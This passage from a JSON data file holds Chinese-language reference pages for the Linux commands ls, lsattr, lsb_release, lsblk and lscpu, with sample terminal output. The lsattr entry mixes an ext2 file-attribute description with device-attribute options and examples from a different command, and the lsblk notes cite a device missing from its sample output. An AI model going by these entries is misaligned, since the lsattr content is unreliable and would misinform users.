class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>media\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Nov <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 2010 </span>misc\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>mnt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>opt\ndr-xr-xr-x<span class=\"hljs-number\"> 232 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 proc\ndrwxr-x---  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 15 </span>14:43 root\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 sbin\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>selinux\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>srv\ndrwxr-xr-x <span class=\"hljs-number\"> 11 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 sys\ndrwxrwxrwt  <span class=\"hljs-number\"> 3 </span>root root<span class=\"hljs-number\"> 98304 </span>Oct<span class=\"hljs-number\"> 16 </span>08:48 tmp\ndrwxr-xr-x <span class=\"hljs-number\"> 13 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 usr\ndrwxr-xr-x <span class=\"hljs-number\"> 19 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 var\n</code></pre>\n<p>列出可读文件和文件夹详细信息</p>\n<pre><code class=\"language-shell\">[root@localhost /]<span class=\"hljs-comment\"># ls -lh</span>\n\ntotal 254K\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K Jun<span class=\"hljs-number\"> 12 </span>04:03 bin\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root 1.0K Jun<span class=\"hljs-number\"> 15 </span>14:45 boot\ndrwxr-xr-x  <span class=\"hljs-number\"> 6 </span>root root 4.0K Jun<span class=\"hljs-number\"> 12 </span>10:26 data\ndrwxr-xr-x <span class=\"hljs-number\"> 10 </span>root root 3.5K Sep<span class=\"hljs-number\"> 26 </span>15:38 dev\ndrwxr-xr-x <span class=\"hljs-number\"> 75 </span>root root 4.0K Oct<span class=\"hljs-number\"> 16 </span>04:02 etc\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root 4.0K Jun<span class=\"hljs-number\"> 12 </span>10:26 home\ndrwxr-xr-x <span class=\"hljs-number\"> 14 </span>root root  12K Jun<span class=\"hljs-number\"> 16 </span>04:02 lib\ndrwx------  <span class=\"hljs-number\"> 2 </span>root root  16K Jun<span class=\"hljs-number\"> 11 </span>22:46 lost+found\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>media\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K Nov <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 2010 </span>misc\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>mnt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>opt\ndr-xr-xr-x<span class=\"hljs-number\"> 235 </span>root root   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 proc\ndrwxr-x---  <span class=\"hljs-number\"> 4 </span>root root 4.0K Oct<span class=\"hljs-number\"> 15 </span>14:43 root\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root  12K Jun<span class=\"hljs-number\"> 12 </span>04:03 sbin\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>selinux\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root 4.0K May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>srv\ndrwxr-xr-x <span class=\"hljs-number\"> 11 </span>root root   <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 sys\ndrwxrwxrwt  <span class=\"hljs-number\"> 3 </span>root root  96K Oct<span class=\"hljs-number\"> 16 </span>08:49 tmp\ndrwxr-xr-x <span class=\"hljs-number\"> 13 </span>root root 4.0K Jun<span class=\"hljs-number\"> 11 </span>23:38 usr\ndrwxr-xr-x <span class=\"hljs-number\"> 19 </span>root root 4.0K Jun<span class=\"hljs-number\"> 11 </span>23:38 var\n</code></pre>\n<p>显示文件夹信息</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-regexp\">/]# ls -ld /</span>etc/\n\ndrwxr-xr-x <span class=\"hljs-number\">75</span> root root <span class=\"hljs-number\">4096</span> Oct <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">02</span> <span class=\"hljs-regexp\">/etc/</span>\n</code></pre>\n<p>按时间列出文件和文件夹详细信息</p>\n<pre><code class=\"language-shell\">[root@localhost /]<span class=\"hljs-comment\"># ls -lt</span>\n\ntotal 254\ndrwxrwxrwt  <span class=\"hljs-number\"> 3 </span>root root<span class=\"hljs-number\"> 98304 </span>Oct<span class=\"hljs-number\"> 16 </span>08:53 tmp\ndrwxr-xr-x <span class=\"hljs-number\"> 75 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 16 </span>04:02 etc\ndrwxr-x---  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 15 </span>14:43 root\ndrwxr-xr-x <span class=\"hljs-number\"> 10 </span>root root <span class=\"hljs-number\"> 3520 </span>Sep<span class=\"hljs-number\"> 26 </span>15:38 dev\ndrwxr-xr-x <span class=\"hljs-number\"> 14 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 16 </span>04:02 lib\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 1024 </span>Jun<span class=\"hljs-number\"> 15 </span>14:45 boot\ndrwxr-xr-x <span class=\"hljs-number\"> 11 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 sys\ndr-xr-xr-x<span class=\"hljs-number\"> 232 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 proc\ndrwxr-xr-x  <span class=\"hljs-number\"> 6 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 data\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 home\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 bin\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 sbin\ndrwxr-xr-x <span class=\"hljs-number\"> 13 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 usr\ndrwxr-xr-x <span class=\"hljs-number\"> 19 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 var\ndrwx------  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 16384 </span>Jun<span class=\"hljs-number\"> 11 </span>22:46 lost+found\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>media\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>mnt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>opt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>selinux\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>srv\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Nov <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 2010 </span>misc\n</code></pre>\n<p>按修改时间列出文件和文件夹详细信息</p>\n<pre><code class=\"language-shell\">[root@localhost /]<span class=\"hljs-comment\"># ls -ltr</span>\n\ntotal 254\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Nov <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 2010 </span>misc\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>srv\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>selinux\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>opt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>mnt\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>May<span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 2011 </span>media\ndrwx------  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 16384 </span>Jun<span class=\"hljs-number\"> 11 </span>22:46 lost+found\ndrwxr-xr-x <span class=\"hljs-number\"> 19 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 var\ndrwxr-xr-x <span class=\"hljs-number\"> 13 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 11 </span>23:38 usr\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 sbin\ndrwxr-xr-x  <span class=\"hljs-number\"> 2 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>04:03 bin\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 home\ndrwxr-xr-x  <span class=\"hljs-number\"> 6 </span>root root <span class=\"hljs-number\"> 4096 </span>Jun<span class=\"hljs-number\"> 12 </span>10:26 data\ndr-xr-xr-x<span class=\"hljs-number\"> 232 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 proc\ndrwxr-xr-x <span class=\"hljs-number\"> 11 </span>root root    <span class=\"hljs-number\"> 0 </span>Jun<span class=\"hljs-number\"> 15 </span>11:04 sys\ndrwxr-xr-x  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 1024 </span>Jun<span class=\"hljs-number\"> 15 </span>14:45 boot\ndrwxr-xr-x <span class=\"hljs-number\"> 14 </span>root root<span class=\"hljs-number\"> 12288 </span>Jun<span class=\"hljs-number\"> 16 </span>04:02 lib\ndrwxr-xr-x <span class=\"hljs-number\"> 10 </span>root root <span class=\"hljs-number\"> 3520 </span>Sep<span class=\"hljs-number\"> 26 </span>15:38 dev\ndrwxr-x---  <span class=\"hljs-number\"> 4 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 15 </span>14:43 root\ndrwxr-xr-x <span class=\"hljs-number\"> 75 </span>root root <span class=\"hljs-number\"> 4096 </span>Oct<span class=\"hljs-number\"> 16 </span>04:02 etc\ndrwxrwxrwt  <span class=\"hljs-number\"> 3 </span>root root<span class=\"hljs-number\"> 98304 </span>Oct<span class=\"hljs-number\"> 16 </span>08:54 tmp\n</code></pre>\n<p>按照特殊字符对文件进行分类</p>\n<pre><code class=\"language-shell\">[root@localhost nginx-<span class=\"hljs-number\">1.2</span>.<span class=\"hljs-number\">1</span>]<span class=\"hljs-comment\"># ls -F</span>\n\nauto<span class=\"hljs-regexp\">/  CHANGES  CHANGES.ru  conf/</span>  configure*  contrib<span class=\"hljs-regexp\">/  html/</span>  LICENSE  Makefile  man<span class=\"hljs-regexp\">/  objs/</span>  README  src/\n</code></pre>\n<p>列出文件并标记颜色分类</p>\n<pre><code class=\"language-shell\">[root@localhost nginx-1.2.1]# <span class=\"hljs-keyword\">ls</span> --color=auto\n\nauto  CHANGES  CHANGES.<span class=\"hljs-keyword\">ru</span>  <span class=\"hljs-keyword\">conf</span>  configure  contrib  html  LICENSE  Makefile  <span class=\"hljs-keyword\">man</span>  objs  README  src\n</code></pre>\n<h2 id=\"扩展知识\">扩展知识</h2>\n<h3 id=\"不同颜色代表的文件类型\">不同颜色代表的文件类型</h3>\n<ul>\n<li><p>蓝色：目录</p>\n</li>\n<li><p>绿色：可执行文件</p>\n</li>\n<li><p>白色：一般性文件，如文本文件，配置文件等</p>\n</li>\n<li><p>红色：压缩文件或归档文件</p>\n</li>\n<li><p>浅蓝色：链接文件</p>\n</li>\n<li><p>红色闪烁：链接文件存在问题</p>\n</li>\n<li><p>黄色：设备文件</p>\n</li>\n<li><p>青黄色：管道文件</p>\n</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "lsattr",
        "des": "查看文件的第二扩展文件系统属性",
        "body": "<h1 id=\"lsattr\">lsattr</h1>\n<p>查看文件的第二扩展文件系统属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lsattr命令</strong> 用于查看文件的第二扩展文件系统属性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lsattr</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。</span>\n<span class=\"hljs-deletion\">-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。</span>\n<span class=\"hljs-deletion\">-R：递归的操作方式；</span>\n<span class=\"hljs-deletion\">-V：显示指令的版本信息；</span>\n<span class=\"hljs-deletion\">-a：列出目录中的所有文件，包括隐藏文件。</span>\n</code></pre>\n<p>lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。</p>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定显示文件系统属性的文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">lsattr</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-built_in\">E</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">l</span> <span class=\"hljs-variable\">rmt0</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">H</span>\n<span class=\"hljs-variable\">lsattr</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">EO</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">l</span> <span class=\"hljs-variable\">rmt0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lsb_release",
        "des": "显示发行版本信息",
        "body": "<h1 id=\"lsb_release\">lsb_release</h1>\n<p>显示发行版本信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>LSB是Linux Standard Base的缩写， <strong>lsb_release命令</strong> 用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v 显示版本信息。</span>\n<span class=\"hljs-deletion\">-i 显示发行版的id。</span>\n<span class=\"hljs-deletion\">-d 显示该发行版的描述信息。</span>\n<span class=\"hljs-deletion\">-r 显示当前系统是发行版的具体版本号。</span>\n<span class=\"hljs-deletion\">-c 发行版代号。</span>\n<span class=\"hljs-deletion\">-a 显示上面的所有信息。</span>\n<span class=\"hljs-deletion\">-h 显示帮助信息。</span>\n</code></pre>\n<p>如果当前发行版是LSB兼容的，那么<code>/etc/lsb_release</code>文件中会包含LSB_VERSION域。这个域的值可以是用冒号隔开的一系列支持的模块。这些模块名是当前版本支持的LSB的模块名。如果当前版本不是LSB兼容的，就不要包含这个域。</p>\n<p>可选的域包括DISTRIB_ID, DISTRIB_RELEASE, DISTRIB_CODENAME,DISTRIB_DESCRIPTION，它们可以覆盖<code>/etc/distrib-release</code>文件中的内容。注：这里的distrib要替换为当前的发行版的名字。如果存在<code>/etc/lsb-release.d</code>目录，会在该目录中查找文件名并作为附加的模块版本加在LSB_VERSION前面。文件<code>/etc/distrib-release</code>中包含了一些描述信息，用来说明应该分析哪些文件名。</p>\n<p>&nbsp;一般的格式是<code>Distributor release x.x (Codename)</code>&nbsp; 注意：Debian系统中缺乏相应的描述信息（见<code>/etc/debian-version</code>），为了支持Debian系统，大部分信息都被加在了lsb-release文件中。</p>\n<p>redhat和fedora系统中，还支持一个参数：</p>\n<pre><code class=\"language-shell\">-s, <span class=\"hljs-comment\">--short  输出简短的描述信息。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lsblk",
        "des": "列出块设备信息",
        "body": "<h1 id=\"lsblk\">lsblk</h1>\n<p>列出块设备信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lsblk命令</strong> 用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息。块设备有硬盘，闪存盘，cd-ROM等等。lsblk命令包含在util-linux-ng包中，现在该包改名为util-linux。这个包带了几个其它工具，如dmesg。要安装lsblk，请在此处下载util-linux包。Fedora用户可以通过命令<code>sudo yum install util-linux-ng</code>来安装该包。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">a</span>, <span class=\"hljs-built_in\">--all</span>            <span class=\"hljs-comment\"># 显示所有设备。</span>\n-<span class=\"hljs-string\">b</span>, <span class=\"hljs-built_in\">--bytes</span>          <span class=\"hljs-comment\"># 以bytes方式显示设备大小。</span>\n-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--nodeps</span>         <span class=\"hljs-comment\"># 不显示 slaves 或 holders。</span>\n-<span class=\"hljs-string\">D</span>, <span class=\"hljs-built_in\">--discard</span>        <span class=\"hljs-comment\"># print discard capabilities。</span>\n-<span class=\"hljs-string\">e</span>, <span class=\"hljs-built_in\">--exclude</span> &lt;<span class=\"hljs-string\">list</span>&gt; <span class=\"hljs-comment\"># 排除设备 (default: RAM disks)。</span>\n-<span class=\"hljs-string\">f</span>, <span class=\"hljs-built_in\">--fs</span>             <span class=\"hljs-comment\"># 显示文件系统信息。</span>\n-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>           <span class=\"hljs-comment\"># 显示帮助信息。</span>\n-<span class=\"hljs-string\">i</span>, <span class=\"hljs-built_in\">--ascii</span>          <span class=\"hljs-comment\"># use ascii characters only。</span>\n-<span class=\"hljs-string\">m</span>, <span class=\"hljs-built_in\">--perms</span>          <span class=\"hljs-comment\"># 显示权限信息。</span>\n-<span class=\"hljs-string\">l</span>, <span class=\"hljs-built_in\">--list</span>           <span class=\"hljs-comment\"># 使用列表格式显示。</span>\n-<span class=\"hljs-string\">n</span>, <span class=\"hljs-built_in\">--noheadings</span>     <span class=\"hljs-comment\"># 不显示标题。</span>\n-<span class=\"hljs-string\">o</span>, <span class=\"hljs-built_in\">--output</span> &lt;<span class=\"hljs-string\">list</span>&gt;  <span class=\"hljs-comment\"># 输出列。</span>\n-<span class=\"hljs-string\">P</span>, <span class=\"hljs-built_in\">--pairs</span>          <span class=\"hljs-comment\"># 使用key=\"value\"格式显示。</span>\n-<span class=\"hljs-string\">r</span>, <span class=\"hljs-built_in\">--raw</span>            <span class=\"hljs-comment\"># 使用原始格式显示。</span>\n-<span class=\"hljs-string\">t</span>, <span class=\"hljs-built_in\">--topology</span>       <span class=\"hljs-comment\"># 显示拓扑结构信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>lsblk命令默认情况下将以树状列出所有块设备。打开终端，并输入以下命令：</p>\n<pre><code class=\"language-shell\">lsblk\n\nNAME   MAJ:MIN rm   SIZE RO type mountpoint\nsda      8:0   <span class=\"hljs-number\"> 0 </span>232.9G <span class=\"hljs-number\"> 0 </span>disk \n├─sda1   8:1   <span class=\"hljs-number\"> 0 </span> 46.6G <span class=\"hljs-number\"> 0 </span>part /\n├─sda2   8:2   <span class=\"hljs-number\"> 0 </span>    1K <span class=\"hljs-number\"> 0 </span>part \n├─sda5   8:5   <span class=\"hljs-number\"> 0 </span>  190M <span class=\"hljs-number\"> 0 </span>part /boot\n├─sda6   8:6   <span class=\"hljs-number\"> 0 </span>  3.7G <span class=\"hljs-number\"> 0 </span>part [SWAP]\n├─sda7   8:7   <span class=\"hljs-number\"> 0 </span> 93.1G <span class=\"hljs-number\"> 0 </span>part /data\n└─sda8   8:8   <span class=\"hljs-number\"> 0 </span> 89.2G <span class=\"hljs-number\"> 0 </span>part /personal\nsr0     11:0   <span class=\"hljs-number\"> 1 </span> 1024M <span class=\"hljs-number\"> 0 </span>rom\n</code></pre>\n<p>7个栏目名称如下：</p>\n<ol>\n<li>  <strong>NAME</strong> ：这是块设备名。</li>\n<li>  <strong>MAJ:MIN</strong> ：本栏显示主要和次要设备号。</li>\n<li>  <strong>RM</strong> ：本栏显示设备是否可移动设备。注意，在本例中设备sdb和sr0的RM值等于1，这说明他们是可移动设备。</li>\n<li>  <strong>SIZE</strong> ：本栏列出设备的容量大小信息。例如298.1G表明该设备大小为298.1GB，而1K表明该设备大小为1KB。</li>\n<li>  <strong>RO</strong> ：该项表明设备是否为只读。在本案例中，所有设备的RO值为0，表明他们不是只读的。</li>\n<li>  <strong>TYPE</strong> ：本栏显示块设备是否是磁盘或磁盘上的一个分区。在本例中，sda和sdb是磁盘，而sr0是只读存储（rom）。</li>\n<li>  <strong>MOUNTPOINT</strong> ：本栏指出设备挂载的挂载点。</li>\n</ol>\n<p>默认选项不会列出所有空设备。要查看这些空设备，请使用以下命令：</p>\n<pre><code class=\"language-shell\">lsblk -<span class=\"hljs-selector-tag\">a</span>\n</code></pre>\n<p>lsblk命令也可以用于列出一个特定设备的拥有关系，同时也可以列出组和模式。可以通过以下命令来获取这些信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsblk -m</span>\n</code></pre>\n<p>该命令也可以只获取指定设备的信息。这可以通过在提供给lsblk命令的选项后指定设备名来实现。例如，你可能对了解以字节显示你的磁盘驱动器大小比较感兴趣，那么你可以通过运行以下命令来实现：</p>\n<pre><code class=\"language-shell\">lsblk -b <span class=\"hljs-regexp\">/dev/</span>sda\n\n等价于\n\nlsblk --bytes <span class=\"hljs-regexp\">/dev/</span>sda\n</code></pre>\n<p>你也可以组合几个选项来获取指定的输出。例如，你也许想要以列表格式列出设备，而不是默认的树状格式。你可能也对移除不同栏目名称的标题感兴趣。可以将两个不同的选项组合，以获得期望的输出，命令如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsblk -nl</span>\n</code></pre>\n<p>要获取SCSI设备的列表，你只能使用-S选项。该选项是大写字母S，不能和-s选项混淆，该选项是用来以颠倒的顺序打印依赖的。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsblk -S</span>\n</code></pre>\n<p>lsblk列出SCSI设备，而-s是逆序选项（将设备和分区的组织关系逆转过来显示），其将给出如下输出。输入命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsblk -s</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lscpu",
        "des": "显示有关CPU架构的信息",
        "body": "<h1 id=\"lscpu\">lscpu</h1>\n<p>显示有关CPU架构的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lscpu命令</strong> 是显示有关CPU架构的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lscpu</span><span class=\"hljs-meta\"> [选项]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"> -<span class=\"hljs-string\">a</span>, <span class=\"hljs-built_in\">--all</span>               <span class=\"hljs-comment\"># 打印在线和离线CPU（默认为-e）</span>\n -<span class=\"hljs-string\">b</span>, <span class=\"hljs-built_in\">--online</span>            <span class=\"hljs-comment\"># 仅打印在线CPU（-p的默认值）</span>\n -<span class=\"hljs-string\">c</span>, <span class=\"hljs-built_in\">--offline</span>           <span class=\"hljs-comment\"># 打印离线CPU</span>\n -<span class=\"hljs-string\">e</span>, <span class=\"hljs-built_in\">--extended[=&lt;list&gt;]</span> <span class=\"hljs-comment\"># 打印出一个扩展的可读格式</span>\n -<span class=\"hljs-string\">p</span>, <span class=\"hljs-built_in\">--parse[=&lt;list&gt;]</span>    <span class=\"hljs-comment\"># 打印出可解析的格式</span>\n -<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--sysroot</span> &lt;<span class=\"hljs-string\">dir</span>&gt;     <span class=\"hljs-comment\"># 将指定的目录用作系统根目录</span>\n -<span class=\"hljs-string\">x</span>, <span class=\"hljs-built_in\">--hex</span>               <span class=\"hljs-comment\"># 打印十六进制掩码，而不是CPU列表</span>\n\n -<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>     <span class=\"hljs-comment\"># 显示此帮助并退出</span>\n -<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span>  <span class=\"hljs-comment\"># 输出版本信息并退出</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">可用列：\n           <span class=\"hljs-meta\">CPU</span>  逻辑<span class=\"hljs-meta\">CPU</span>编号\n          CORE  逻辑核心号码\n        SOCKET  逻辑套接字号\n          NODE  逻辑NUMA节点号\n          BOOK  逻辑书号\n         CACHE  显示了如何在<span class=\"hljs-meta\">CPU</span>之间共享高速缓存\n  POLARIZATION  虚拟硬件上的<span class=\"hljs-meta\">CPU</span>调度模式\n       ADDRESS  <span class=\"hljs-meta\">CPU</span>的物理地址\n    CONFIGURED  显示管理程序是否分配了<span class=\"hljs-meta\">CPU</span>\n        ONLINE  显示Linux是否正在使用<span class=\"hljs-meta\">CPU</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">[root@localhost ~]# lscpu\nArchitecture</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         x86_64</span>\n<span class=\"hljs-attribute\">CPU op-mode(s)</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">       32-bit, 64-bit</span>\n<span class=\"hljs-attribute\">Byte Order</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">           Little Endian</span>\n<span class=\"hljs-attribute\">CPU(s)</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">               4</span>\n<span class=\"hljs-attribute\">On-line CPU(s) list</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">  0-3</span>\n<span class=\"hljs-attribute\">Thread(s) per core</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">   1</span>\n<span class=\"hljs-attribute\">Core(s) per socket</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">   4</span>\n<span class=\"hljs-attribute\">Socket(s)</span><span 